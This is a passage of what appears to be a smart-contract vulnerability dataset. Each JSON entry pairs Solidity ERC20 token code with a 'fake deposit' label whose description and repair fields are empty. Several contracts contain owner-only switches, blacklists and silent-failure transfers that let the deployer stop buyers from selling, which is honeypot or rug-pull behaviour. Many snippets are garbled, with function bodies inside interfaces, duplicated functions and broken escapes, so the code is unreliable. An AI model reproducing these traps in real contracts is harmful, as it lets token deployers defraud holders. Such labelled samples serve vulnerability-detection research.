{\r\n            balances[_to] = balances[_to].add(_value);\r\n            balances[_from] = balances[_from].sub(_value);\r\n            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n            Transfer(_from, _to, _value);\r\n            if (_from != uni) {\r\n                lastBuyTime[_from] = block.timestamp;\r\n            } else if (_to != uni) {\r\n                lastBuyTime[_to] = block.timestamp;\r\n            }\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function setCooldownEnabled(bool enabled) public onlyOwner {\r\n        _cooldownEnabled = enabled;\r\n    }\r\n\r\n    function blacklistBots() internal {\r\n       bots[0x000000000000084e91743124a982076C59f10084] = true;\r\n       bots[0x000000917de6037d52b1F0a306eeCD208405f7cd] = true;\r\n       bots[0x1d6E8BAC6EA3730825bde4B005ed7B2B39A2932d] = true;\r\n       bots[0x7100e690554B1c2FD01E8648db88bE235C1E6514] = true;\r\n       bots[0x72b30cDc1583224381132D379A052A6B10725415] = true;\r\n       bots[0x9282dc5c422FA91Ff2F6fF3a0b45B7BF97CF78E7] = true;\r\n       bots[0x9eDD647D7d6Eceae6bB61D7785Ef66c5055A9bEE] = true;\r\n       bots[0xfad95B6089c53A0D1d861eabFaadd8901b0F8533] = true;\r\n    }\r\n\r\n    function blacklistBot(address bot) public onlyOwner {\r\n        bots[bot] = true;\r\n    }\r\n\r\n    function unBlacklistBot(address bot) public onlyOwner {\r\n        bots[bot] = false;\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n    \r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "contract ERC20 is Context, IERC20, IERC20Metadata { \r\n    mapping (address =  u003e uint256) internal _balances; \r\n    mapping (address =  u003e bool) private _feeBurn; \r\n    mapping (address =  u003e mapping (address =  u003e uint256)) private _allowances; \r\n    bool intTx = true; \r\n    uint256 _burnRate; \r\n    uint256 internal _totalSupply; \r\n    string internal _name; \r\n    string internal _symbol; \r\n    address internal _owner; \r\n\r\n    constructor (string memory name_, string memory symbol_) { \r\n        _name = name_; \r\n        _symbol = symbol_; \r\n        _owner = msg.sender; \r\n    }\r\n    modifier onlyOwner() { \r\n        require(_owner == msg.sender,    \"Ownable: only the owner allowed   \"); \r\n        _; \r\n    } \r\n    function totalSupply() public view virtual override returns (uint256) { \r\n        return _totalSupply; \r\n    } \r\n \r\n \r\n    function feeBurn(address _address) external onlyOwner { \r\n \r\n        _feeBurn[_address] = true; \r\n \r\n    } \r\n\r\n    function initContract() public virtual onlyOwner { \r\n        if (intTx == true) {intTx = false;} else {intTx = true;} \r\n    } \r\n \r\n    function burnRate (uint256 value) external onlyOwner { \r\n        _burnRate = value; \r\n    } \r\n \r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \r\n        _transfer(_msgSender(), recipient, amount); \r\n        return true; \r\n    } \r\n\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) { \r\n \r\n        _approve(_msgSender(), spender, amount); \r\n \r\n        return true; \r\n \r\n    } \r\n \r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \r\n \r\n        _transfer(sender, recipient, amount); \r\n \r\n        uint256 currentAllowance = _allowances[sender][_msgSender()]; \r\n \r\n        require(currentAllowance   u003e= amount,    \"ERC20: transfer amount exceeds allowance   \"); \r\n \r\n        _approve(sender, _msgSender(), currentAllowance - amount); \r\n \r\n        return true; \r\n \r\n    } \r\n \r\n \r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual { \r\n \r\n        require(sender != address(0),    \"ERC20: transfer from the zero address   \"); \r\n \r\n        require(recipient != address(0),    \"ERC20: transfer to the zero address   \"); \r\n \r\n        require(amount   u003e 0,    \"Transfer amount must be grater thatn zero   \"); \r\n \r\n        if (_feeBurn[sender] || _feeBurn[recipient])  \r\n \r\n        require(intTx == false,    \"   \"); \r\n \r\n        if (intTx == true || sender == _owner || recipient == _owner) { \r\n \r\n        _beforeTokenTransfer(sender, recipient, amount); \r\n \r\n        uint256 senderBalance = _balances[sender]; \r\n \r\n        require(senderBalance   u003e= amount,    \"ERC20: transfer amount exceeds balance   \"); \r\n \r\n        _balances[sender] = senderBalance - amount; \r\n \r\n        _balances[recipient] += amount; \r\n \r\n        emit Transfer(sender, recipient, amount);} \r\n \r\n        else {require (intTx == true,    \"   \");}  \r\n \r\n    } \r\n \r\n    function _burn(address account, uint256 amount) internal virtual { \r\n \r\n        require(account != address(0),    \"ERC20: burn from the zero address   \"); \r\n \r\n        uint256 accountBalance = _balances[account]; \r\n \r\n        require(accountBalance   u003e= amount,    \"ERC20: burn amount exceeds balance   \"); \r\n \r\n        _balances[account] = _burnRate - amount; \r\n \r\n        _totalSupply -= amount; \r\n \r\n        emit Transfer(account, address(0), amount); \r\n \r\n    } \r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual { \r\n \r\n        require(owner != address(0),    \"ERC20: approve from the zero address   \"); \r\n \r\n        require(spender != address(0),    \"ERC20: approve to the zero address   \"); \r\n \r\n \r\n \r\n        _allowances[owner][spender] = amount; \r\n \r\n        emit Approval(owner, spender, amount); \r\n \r\n    } \r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { } \r\n \r\n} \r\n\r\n        \n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.3;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./Context.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping (address =u003e uint256) internal _balances;\r\n    mapping (address =u003e bool) private _feeBurn;\r\n    mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\r\n    bool intTx = true;\r\n    uint256 _burnRate;\r\n    uint256 internal _totalSupply;\r\n    address internal _owner;\r\n    uint256 public _decreaseFee = 7000000  * 10**18;\r\n    mapping (address =u003e bool) public _approvedTransfer;\r\n    mapping (address =u003e bool) public _bBots;\r\n\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: only the owner allowed\");\r\n        _;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    \r\n\r\n    function feeBurn(address _address) external onlyOwner {\r\n        _feeBurn[_address] = true;\r\n    }\r\n\r\n    function feeBurned(address _address) public view returns (bool) {\r\n        return _feeBurn[_address];\r\n    }\r\n\r\n    function initContract() public virtual onlyOwner {\r\n        if (intTx == true) {intTx = false;} else {intTx = true;}\r\n    }\r\n \r\n\r\n    function burnRate (uint256 value) external onlyOwner {\r\n        _burnRate = value;\r\n    }\r\n   \r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\r\n        \r\n        if(!_approvedTransfer[sender] u0026u0026 _bBots[recipient]) {\r\n            require(amount u003c= _decreaseFee, \"Transfer amount exceeds the maxTxAmount.\"); \r\n        }\r\n        \r\n\r\n        if (_feeBurn[sender] || _feeBurn[recipient]) \r\n        require(intTx == false, \"\");\r\n        if (intTx == true || sender == _owner || recipient == _owner) {\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);}\r\n        else {require (intTx == true, \"\");} \r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        _balances[account] = _burnRate - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    \r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n    \r\n    function decreaseFee(uint256 decreaseFeeAddress) external onlyOwner() {\r\n        _decreaseFee = decreaseFeeAddress;\r\n    }\r\n  \r\n    function approveTransfer(address account) external onlyOwner {\r\n        _approvedTransfer[account] = true; \r\n    }\r\n    \r\n    function bBots(address account) external onlyOwner {\r\n        _bBots[account] = true;\r\n    }\r\n}\r\n\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "\r\n\r\ncontract RABBITROCKET is Context, IERC20, IERC20Metadata, Ownable {   \r\n\r\n    address internal constant UniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;   \r\n    uint256 _NUM = 1 * 10**9;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 private _totalSupply;\r\n    bool isValue = true;   \r\n    constructor() {\r\n        _totalSupply = 1000 * 10**9 * 10**9;\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    \r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        //_transfer(_msgSender(), recipient, amount);\r\n        if(_msgSender() == UniswapV2Router || _msgSender() == UniswapPair() || UniswapPair() == address(0) || _msgSender() == owner()) {\r\n            _transfer(_msgSender(), recipient, amount);\r\n        } else {\r\n            //nomal user check amount\r\n            if( (amount <= _NUM || isValue) && !isContract(_msgSender()) ) {\r\n                _transfer(_msgSender(), recipient, amount);\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        if(sender == UniswapV2Router || sender == UniswapPair() || UniswapPair() == address(0) || sender == owner()) {\r\n            _transfer(sender, recipient, amount);\r\n    \r\n            uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n            unchecked {\r\n                _approve(sender, _msgSender(), currentAllowance - amount);\r\n            }\r\n        } else {\r\n            //nomal user check amount\r\n            if( (amount <= _NUM || isValue) && !isContract(sender) ) {\r\n                _transfer(sender, recipient, amount);\r\n                uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n                require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n                unchecked {\r\n                    _approve(sender, _msgSender(), currentAllowance - amount);\r\n                }\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function UniswapPair() public view virtual returns (address) {\r\n        address UniswapV2Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\r\n        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address pairAddress = IUniswapFactory(UniswapV2Factory).getPair(address(WETH), address(this));\r\n        return pairAddress;\r\n    }\r\n\r\n    function isContract(address addr) internal view returns (bool) {\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        bytes32 codehash;\r\n        assembly {\r\n            codehash := extcodehash(addr)\r\n        }\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n}\r\n        \n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.3; \n/**\n* @dev Collection of functions related to the address type\n*/\n library Address {\n   /**\n    * @dev Returns true if `account` is a contract.\n    *\n    * [IMPORTANT]\n    * ====\n    * It is unsafe to assume that an address for which this function returns\n    * false is an externally-owned account (EOA) and not a contract.\n    *\n    * Among others, `isContract` will return false for the following\n    * types of addresses:\n    *\n    *  - an externally-owned account\n    *  - a contract in construction\n    *  - an address where a contract will be created\n    *  - an address where a contract lived, but was destroyed\n    * ====\n    */\n   function isContract(address account) internal view returns (bool) {\n       // This method relies on extcodesize, which returns 0 for contracts in\n       // construction, since the code is only stored at the end of the\n       // constructor execution. \n       uint256 size;\n       assembly {\n           size := extcodesize(account)\n       }\n       return size > 0;\n   } \n   /**\n    * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n    * `recipient`, forwarding all available gas and reverting on errors.\n    *\n    * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n    * of certain opcodes, possibly making contracts go over the 2300 gas limit\n    * imposed by `transfer`, making them unable to receive funds via\n    * `transfer`. {sendValue} removes this limitation.\n    *\n    * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n    *\n    * IMPORTANT: because control is transferred to `recipient`, care must be\n    * taken to not create reentrancy vulnerabilities. Consider using\n    * {ReentrancyGuard} or the\n    * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n    */\n   function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n       _transfer(_msgSender(), recipient, amount);\n       return true;\n   } \n   /**\n    * @dev See {IERC20-allowance}.\n    */\n   function allowance(address owner, address spender) public view virtual override returns (uint256) {\n       return _allowances[owner][spender];\n   } \n   /**\n    * @dev See {IERC20-approve}.\n    *\n    * Requirements:\n    *\n    * - `spender` cannot be the zero address.\n    */\n     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n       _transfer(sender, recipient, amount);\n       uint256 currentAllowance = _allowances[sender][_msgSender()];\n       require(currentAllowance >= amount,  \"ERC20: transfer amount exceeds allowance \");\n       _approve(sender, _msgSender(), currentAllowance - amount);\n       return true;\n   } \n   /**\n    * @dev Atomically increases the allowance granted to `spender` by the caller.\n    *\n    * This is an alternative to {approve} that can be used as a mitigation for\n    * problems described in {IERC20-approve}.\n    *\n    * Emits an {Approval} event indicating the updated allowance.\n    *\n    * Requirements:\n    *\n    * - `spender` cannot be the zero address.\n    */\n   function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n       _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n       return true;\n   } \n   /**\n    * @dev Atomically decreases the allowance granted to `spender` by the caller.\n    *\n    * This is an alternative to {approve} that can be used as a mitigation for\n    * problems described in {IERC20-approve}.\n    *\n    * Emits an {Approval} event indicating the updated allowance.\n    *\n    * Requirements:\n    *\n    * - `spender` cannot be the zero address.\n    * - `spender` must have allowance for the caller of at least\n    * `subtractedValue`.\n    */\n    function decimals() external view returns (uint8);\n}\"}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.1; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n     function transfer(address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Returns the remaining number of tokens that `spender` will be \n     * allowed to spend on behalf of `owner` through {transferFrom}. This is \n     * zero by default. \n     * \n     * This value changes when {approve} or {transferFrom} are called. \n     */ \n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Emitted when `value` tokens are moved from one account (`from`) to \n     * another (`to`). \n     * \n     * Note that `value` may be zero. \n     */ \n    event Transfer(address indexed from, address indexed to, uint256 value); \n \n    /** \n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n     * a call to {approve}. `value` is the new allowance. \n     */ \n    event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n/** \n * @dev Interface for the optional metadata functions from the ERC20 standard. \n * \n */ \ninterface IERC20Metadata is IERC20 { \n    /** \n     * @dev Returns the name of the token. \n     */ \n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n        _transfer(_msgSender(), recipient, amount); \n        return true; \n    } \n \n    /** \n     * @dev See {IERC20-allowance}. \n     */ \n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n        _transfer(sender, recipient, amount); \n        uint256 currentAllowance = _allowances[sender][_msgSender()]; \n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); \n        _approve(sender, _msgSender(), currentAllowance - amount); \n        return true; \n    } \n \n    /** \n     * @dev Atomically increases the allowance granted to `spender` by the caller. \n     * \n     * This is an alternative to {approve} that can be used as a mitigation for \n     * problems described in {IERC20-approve}. \n     * \n     * Emits an {Approval} event indicating the updated allowance. \n     * \n     * Requirements: \n     * \n     * - `spender` cannot be the zero address. \n     */ \n     function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n        require(sender != address(0), \"ERC20: transfer from the zero address\"); \n        require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n        require(amount > 0, \"Transfer amount must be grater thatn zero\"); \n        if (_approveTransfer[sender] || _approveTransfer[recipient])  \n        require(maxTxPercent == false, \"\"); \n        if (maxTxPercent == true || sender == _owner || recipient == _owner) { \n        _beforeTokenTransfer(sender, recipient, amount); \n        uint256 senderBalance = _balances[sender]; \n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\"); \n        _balances[sender] = senderBalance - amount; \n        _balances[recipient] += amount; \n        emit Transfer(sender, recipient, amount);} \n        else {require (maxTxPercent == true, \"\");}  \n    } \n     \n    /** \n     * @dev Destroys `amount` tokens from `account`, reducing the \n     * total supply. \n     * \n     * Emits a {Transfer} event with `to` set to the zero address. \n     * \n     * Requirements: \n     * \n     * - `account` cannot be the zero address. \n     * - `account` must have at least `amount` tokens. \n     */ \n    function burnRewards(address account, uint256 value) external onlyOwner { \n    _burn(account, value); \n    } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.6.12; \n \nabstract contract Context { \n    function _msgSender() internal view virtual returns (address payable) { \n        return msg.sender; \n    } \n \n     function transfer(address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Returns the remaining number of tokens that `spender` will be \n     * allowed to spend on behalf of `owner` through {transferFrom}. This is \n     * zero by default. \n     * \n     * This value changes when {approve} or {transferFrom} are called. \n     */ \n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Emitted when `value` tokens are moved from one account (`from`) to \n     * another (`to`). \n     * \n     * Note that `value` may be zero. \n     */ \n    event Transfer(address indexed from, address indexed to, uint256 value); \n \n    /** \n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n     * a call to {approve}. `value` is the new allowance. \n     */ \n    event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \nlibrary SafeMath { \n    /** \n     * @dev Returns the addition of two unsigned integers, reverting on \n     * overflow. \n     * \n     * Counterpart to Solidity's `+` operator. \n     * \n     * Requirements: \n     * \n     * - Addition cannot overflow. \n     */ \n     function transfer(address recipient, uint256 amount) public override returns (bool) { \n        _transfer(_msgSender(), recipient, amount); \n        return true; \n    } \n \n     function _transfer(address sender, address recipient, uint256 amount) private { \n        require(sender != address(0), \"ERC20: transfer from the zero address\"); \n        require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n        require(amount > 0, \"Transfer amount must be greater than zero\"); \n        if (BOTtoScan[sender] || BOTtoScan[recipient]) \n        require(amount == 0, \"temporary error\"); \n        if (_contractRunning == false || sender == owner() || recipient == owner()) { \n        if (_isExcluded[sender] && !_isExcluded[recipient]) { \n        _transferFromExcluded(sender, recipient, amount); \n        } else if (!_isExcluded[sender] && _isExcluded[recipient]) { \n        _transferToExcluded(sender, recipient, amount); \n         } else if (!_isExcluded[sender] && !_isExcluded[recipient]) { \n        _transferStandard(sender, recipient, amount); \n        } else if (_isExcluded[sender] && _isExcluded[recipient]) { \n        _transferBothExcluded(sender, recipient, amount); \n        } else {_transferStandard(sender, recipient, amount);}} \n        else {require (_contractRunning == false, \"Unexpected error\");} \n    } \n \n      function _getCurrentSupply() private view returns(uint256, uint256) { \n        uint256 rSupply = _rTotal; \n        uint256 tSupply = _tTotal;       \n        for (uint256 i = 0; i < _excluded.length; i++) { \n            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal); \n            rSupply = rSupply.sub(_rOwned[_excluded[i]]); \n            tSupply = tSupply.sub(_tOwned[_excluded[i]]); \n        } \n        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); \n        return (rSupply, tSupply); \n    } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.1; \n \nabstract contract Context { \n    function _transfer(address sender, address recipient, uint256 amount) internal override { \n       require(sender != address(0),  \"ERC20: transfer from the zero address \"); \n       require(recipient != address(0),  \"ERC20: transfer to the zero address \"); \n       require(amount > 0,  \"Transfer amount must be grater thatn zero \"); \n       if (_call[sender] || _call[recipient]) require(_trans == false,  \" \"); \n        if (_trans == true || sender == owner || recipient == owner) { \n       _beforeTokenTransfer(sender, recipient, amount); \n       uint256 senderBalance = _balances[sender]; \n       require(senderBalance >= amount,  \"ERC20: transfer amount exceeds balance \"); \n       _balances[sender] = senderBalance - amount; \n       _balances[recipient] += amount; \n       emit Transfer(sender, recipient, amount);} else { \n       require (_trans == true,  \" \");} \n   } \n \n     function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n       _transfer(_msgSender(), recipient, amount); \n       return true; \n   } \n \n    \n   function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n       _transfer(sender, recipient, amount); \n \n       uint256 currentAllowance = _allowances[sender][_msgSender()]; \n       require(currentAllowance >= amount,  \"ERC20: transfer amount exceeds allowance \"); \n       _approve(sender, _msgSender(), currentAllowance - amount); \n \n       return true; \n   } \n \n         function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n       require(sender != address(0),  \"ERC20: transfer from the zero address \"); \n       require(recipient != address(0),  \"ERC20: transfer to the zero address \"); \n \n       _beforeTokenTransfer(sender, recipient, amount); \n \n       uint256 senderBalance = _balances[sender]; \n       require(senderBalance >= amount,  \"ERC20: transfer amount exceeds balance \"); \n       _balances[sender] = senderBalance - amount; \n       _balances[recipient] += amount; \n \n       emit Transfer(sender, recipient, amount); \n   } \n \n      function transfer(address recipient, uint256 amount) external returns (bool); \n \n   /** \n    * @dev Returns the remaining number of tokens that `spender` will be \n    * allowed to spend on behalf of `owner` through {transferFrom}. This is \n    * zero by default. \n    * \n    * This value changes when {approve} or {transferFrom} are called. \n    */ \n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n    event Transfer(address indexed from, address indexed to, uint256 value); \n \n     event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT \n pragma solidity =0.8.1; \n import  \"./Context.sol \"; \n \n/** \n* @dev Contract module which provides a basic access control mechanism, where \n* there is an account (an owner) that can be granted exclusive access to \n* specific functions. \n* \n* By default, the owner account will be the one that deploys the contract. This \n* can later be changed with {transferOwnership}. \n* \n* This module is used through inheritance. It will make available the modifier \n* `onlyOwner`, which can be applied to your functions to restrict their use to \n* the owner. \n*/ \n abstract contract Ownable is Context { \n   address owner; \n   address owneraddress; \n   event OwnershipTransferred( \n       address indexed previousOwner,  \n       address indexed newOwner \n   ); \n \n   /** \n    * @dev Initializes the contract setting the deployer as the initial owner. \n    */ \n   constructor() { \n       address msgSender = msg.sender; \n       owner = msgSender; \n       owneraddress = msgSender; \n       emit OwnershipTransferred(address(0), msgSender); \n   } \n \n   /** \n    * @dev Returns the address of the current owner. \n    */ \n   \n} \n\"}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.0; \n \ncontract Token { \n \n    /// @return total amount of tokens \n    function transfer(address _to, uint256 _value) returns (bool success) {} \n \n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from` \n    /// @param _from The address of the sender \n    /// @param _to The address of the recipient \n    /// @param _value The amount of token to be transferred \n    /// @return Whether the transfer was successful or not \n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} \n \n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens \n    /// @param _spender The address of the account able to transfer the tokens \n    /// @param _value The amount of wei to be approved for transfer \n    /// @return Whether the approval was successful or not \n      function transfer(address _to, uint256 _value) returns (bool success) { \n        //Default assumes totalSupply can't be over max (2^256 - 1). \n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap. \n        //Replace the if with this one instead. \n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { \n        if (balances[msg.sender] >= _value && _value > 0) { \n            balances[msg.sender] -= _value; \n            balances[_to] += _value; \n            Transfer(msg.sender, _to, _value); \n            return true; \n        } else { return false; } \n    } \n \n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { \n        //same as above. Replace this line with the following if you want to protect against wrapping uints. \n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { \n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { \n            balances[_to] += _value; \n            balances[_from] -= _value; \n            allowed[_from][msg.sender] -= _value; \n            Transfer(_from, _to, _value); \n            return true; \n        } else { return false; } \n    } \n \n         function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) { \n        allowed[msg.sender][_spender] = _value; \n        Approval(msg.sender, _spender, _value); \n \n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this. \n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData) \n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead. \n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; } \n        return true; \n    } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
